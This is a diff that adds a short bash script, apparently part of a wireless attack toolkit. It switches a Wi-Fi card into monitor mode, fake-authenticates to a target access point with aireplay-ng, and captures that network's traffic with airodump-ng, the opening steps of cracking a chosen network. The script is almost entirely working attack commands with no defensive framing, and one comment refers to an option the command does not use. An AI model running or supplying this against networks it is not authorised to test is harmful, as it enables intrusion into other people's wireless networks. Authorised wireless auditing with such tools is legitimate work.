@@ -1,0 +1,36 @@
+#!/bin/bash
+
+if [ "$(id -u)" != "0" ]; then
+	echo "Error: This script must be run as root" 1>&2
+	exit 1
+fi
+
+if [ -f ../cfg/target.conf ]; then
+	. ../cfg/target.conf
+else
+	echo "Error: No target set!"
+	exit 1
+fi
+. ../cfg/hardware.conf
+
+ifconfig $WLAN down
+iwconfig $WLAN mode managed
+ifconfig $WLAN up
+iwconfig $WLAN channel $CHANNEL
+ifconfig $WLAN down
+iwconfig $WLAN mode monitor
+ifconfig $WLAN up
+
+echo "Testing whether we can inject into the ARP..."
+TEST=`aireplay-ng -1 0 -e $ESSID -a $BSSID -h $FAKE_HOST $WLAN | grep "Association successful"`
+
+# Can try removing -o 1 if it fails
+
+if [ "${TEST}" != "" ]; then
+	echo "Successful!"
+	echo "Beginning packet capture."
+	airodump-ng -c $CHANNEL -w /tmp/airodump --bssid $BSSID $WLAN
+else
+	echo "Failed to associate."
+	echo "Aborting capture."
+fi
